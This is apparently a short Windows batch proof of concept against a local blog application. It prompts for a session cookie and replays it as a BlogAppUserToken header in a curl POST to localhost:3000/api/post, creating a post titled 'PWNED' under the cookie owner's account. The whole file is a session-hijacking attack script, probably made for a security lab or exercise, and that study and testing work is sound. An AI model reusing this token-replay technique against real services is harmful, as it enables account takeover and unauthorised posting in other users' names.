set /p "cookie=Enter cookie: "

curl -X POST -H "Cookie: BlogAppUserToken=%cookie%" -H "Content-Type: application/json" -d "{\"title\": \"PWNED\", \"content\": \"PWNED\", \"email\": \"uriziv10@gmail.com\"}" http://localhost:3000/api/post
pause